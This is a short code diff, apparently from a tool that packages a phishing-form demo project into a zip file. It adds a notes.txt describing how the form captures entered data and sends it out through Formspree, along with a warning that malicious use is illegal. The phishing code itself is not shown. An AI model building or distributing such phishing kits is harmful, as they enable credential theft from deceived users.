@@ -184,8 +184,14 @@
     }
   });`;
 
+          const notesContent = `This project demonstrates how a basic phishing form can be created using HTML and JavaScript, 
+and how form data can be captured and sent for free using a service like Formspree.
+
+Using this code for malicious purposes is illegal.`
+
           zip.file("index.html", htmlContent);
           zip.file("script.js", jsContent);
+          zip.file("notes.txt", notesContent);
 
           zip.generateAsync({ type: "blob" }).then((content) => {
             const a = document.createElement("a");
